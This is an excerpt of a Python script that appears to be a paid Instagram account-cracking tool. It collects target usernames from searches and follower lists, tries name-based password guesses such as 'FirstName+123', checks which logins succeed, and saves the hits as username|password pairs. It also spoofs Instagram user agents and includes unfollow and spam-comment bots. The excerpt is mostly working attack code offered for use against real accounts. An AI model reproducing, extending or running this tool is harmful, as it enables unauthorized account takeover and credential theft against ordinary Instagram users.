...
USN="Mozilla/5.0 (Linux; Android 9; SM-G950F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.73 Mobile Safari/537.36 Instagram 227.0.0.12.117 Android (28/9; 480dpi; 1080x2076; samsung; SM-G950F; dreamlte; samsungexynos8895; fr_FR; 358645741)"
bahasa = "en-GB,en-US;q=0.9,en;q=0.8"
#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
###########################################################################################
USN="Mozilla/5.0 (Linux; Android 11; SM-A715F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.73 Mobile Safari/537.36 Instagram 228.0.0.2.111 Android (30/11; 420dpi; 1080x2183; samsung; SM-A715F; a71; qcom; it_IT; 359047637)"
###########################################################################################
...
def cekAPI(cookie):
	...
	try:
		...
		print(f'{H}>{H} Instagram Checkpoint');sleep(4)
		os.remove('.kukis.log')
		os.remove('.username')
		os.system('python CODER.py')
...
def login():
	global external
	try:
		print(f'\n{H}!{H} Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat\n')
		us=input(f"{H}>{H} Masukan username: ")
		pw=stdiomask.getpass(prompt=f'{H}>{H} Masukan password: ')
	except KeyboardInterrupt:
		exit(f'{H}>{H} KeyboardInterrupt detected... exit!')
	...
	if x.get('status')=='success':
		...
		exit(f'{H}>{H} Login checkpoint')
	else:
		exit(f'{H}!{H} The username or password you entered is incorrect')
...
{H}
-----------------------------------------------------------------------------------
*{H}}}{H} AUTHOR :     CHIGOZIEWORLDWIDE
*{H}}}{H} GITHUB : https://github.com/Chigozieworldwide                   
*{H}}}{H} VERSION  :    500.0                                    
*{H}}}{H} WHATSAPP : +2348069472717       
*{H}}}{H} TOOL MADE IN NIGERIAN 🇳🇬 
*{H}}}{H} 1MONTH 100$               
*{H}}}{H} DEVICE ACTIVATED 
*{H}}}{H} TOOL UPDATED MARCH 29 2022
-----------------------------------------------------------------------------------
   CHIGOZIEWORLDWIDE
-----------------------------------------------------------------------------------
*{H}}}{H} GENERATE FROM SEARCH
*{H}}}{H} GENERATE FROM FOLLWERS
*{H}}}{H} GENERATE FROM FOLLOWING
*{H}}}{H} CHECK CRACKED STATUS
*{H}}}{H} VIEW CRACKED RESULTS
*{H}}}{H} UNFOLLOW BOT
*{H}}}{H} REPORT
*{H}}}{H} CHANGE ID LOGIN
*{H}}}{H} LOGOUT
	...
	def BUG(self):
		print(f"""
 [{H}>{H}] Help me develop this script. whatever the bug, please report it to me, the less bugs the better the script.
 [{H}>{H}] You can report directly Admin Tool {H}+2348069472717{H}
		""")
		exit()

	def ChangeLog(self):
		print(f"""
 [{H}>{H}] Updated features:
   -Fix bug login instagram
   -Fix bug crack search name

 [{H}>{H}] Additional features:
   -Bot unfollow instagram
   -Bot spam comments

 [{H}>{H}] Fix bug:
   -The brute force feature is still under repair
   -The unfollow bot feature is still under repair
   -The comment bot feature is still in pk
		""")
		exit()


	def Exit(self):
		x=input(f'\n [{H}>{H}] Are you sure you want to leave? [Y/t]: ')
		if x in ('y','Y'):
			os.remove('.kukis.log')
			os.remove('.username')
			os.system('CODER.py')
...
##-----$$
	...
	def idAPI(self,cookie,id):
		try:
			...
			exit(f"\n [{H}!{H}] The username you entered was not found, make sure the target is public")
		return idx
	...
	def infoAPI(self,cookie,api,id):
		try:
			...
			print(f'\n [{H}!{H}] The username you entered was not found')
		return internal

	def passwordAPI(self,xnx):
		print(f'\n [{H}+{H}] Total id >> [{H}{len(internal)}{H}]')
		print(f"""
 [Instagram password combination list]

 1{H}}}{H} FirstName+123
 2{H}}}{H} FirtsName+123,FullName
 3{H}}}{H} FirstName+123,FullName,Full Name
		""")
		c=input(f' {H}>>>{H} Password: ')
		if c=='1':
	...
	def generateAPI(self,user,o):
		print(f"""
 {H}[{H}1{H}]{H} USER-AGENT 1
 {H}[{H}2{H}]{H} USER-AGENT 2
 {H}[{H}3{H}]{H} USER-AGENT 3
		""")
		ua=input(f' {H}>>{H} user-agent: ')
		if ua=='1':
			uaAPI=User_Agent()
		elif ua=='2':
			uaAPI=user_agent()
		...
		print(f"""
 [{H}+{H}] OK result saved to: result/{day}.txt
 [{H}+{H}] CP result saved to: result/{day}.txt
  ...
  {M}[😭]{M} Posts :         {M}{postingan}{M}
           """)
					...
					sys.stdout.write(f"\r [{H}!{H}] {U}Please wait a few minutes second{H}");sys.stdout.flush();sleep(10)
  ...
  {M}[😭]{M} Posts:        {M}{postingan}{M}
				...
				sys.stdout.write(f"\r [{H}!{H}] {H}Please wait a few minutes second{H}");sys.stdout.flush();sleep(10)
	...
	def menu(self):
		...
		if c=='':
			...
			m=int(input(f'\n [{H}?{H}] Enter the target amount: '));print('')
			for i in range(m):
				i+1
				nama=input(f' [{H}>{H}] Enter search name({H}{len(internal)}{H}): ')
				name=self.searchAPI(self.cookie,nama)
			self.passwordAPI(name)

		elif c in ('2','02'):
			print(f'\n [{H}!{H}] Target must be public, not private')
			m=input(f' [{H}?{H}] Input username instagram: ')
			...
			for i in os.listdir('result'):
				print(f' [{H}>{H}] {i}')
			c=input(f'\n {H}>>>{H} Masukan nama file: ')
			g=open("result/%s"%(c)).read().splitlines()
			print(f'\n [{H}+{H}] Total Result finished{H}{len(g)}{H}')
			print(f'\n [{H}!{H}] The process of checking account status. Please wait a moment\n')
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				self.checkAPI(usr,pwd)
			exit(f'\n\n [{H}#{H}] Process CHECK finished...')
			...
			xx=c.split("-")
			xc=xx[0]
			print(f'\n [{H}>{H}] Total results found [{H}{len(g)}{H}]')
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				fol=s.split("|")[2]
				...
				if xc=="checkpoint":
					print(f"""
 [{M}+{M}] {M}CHECKPOINT LOGIN{M}:
  {M}|{M}
  {M}├╴😭{M} Username: {M}{usr}{M}
  {M}├╴😭{M} Password: {M}{pwd}{M}
  {M}├╴😭{M} Followers: {M}{fol}{M}
  {M}├╴😭{M} Following: {M}{ful}{M}
					""");sleep(0.05)
				else:
					print(f"""
  {H}[😂]{H}{H} STATUS : ACTIVE {H}
  {H}[😂]{H}{H} Username : {H}{usr}{H}
  {H}[😂]{H}{H} Password : {H}{pwd}{H}
  {H}[😂]{H}{H} Followers :   {H}{fol}{H}
  {H}[😂]{H}{H} Following : {H}{ful}{H}
					""");sleep(0.05)
		elif c in ('6','06'):
			global following
			six=0
			print(f'\n [{H}!{H}] Bot Unfollow-All Run\n')
			...
			for i in following:
				...
				print(f' {str(six)}{H}}}{H} {i} {H}Unfollow-Succeed{H}')
				self.unfollowAPI(six_id,'5452333948',self.cookie)
				#print(w)
			input(f'\n\n [{H}#{H}] Unfollow-all finished...');self.menu()
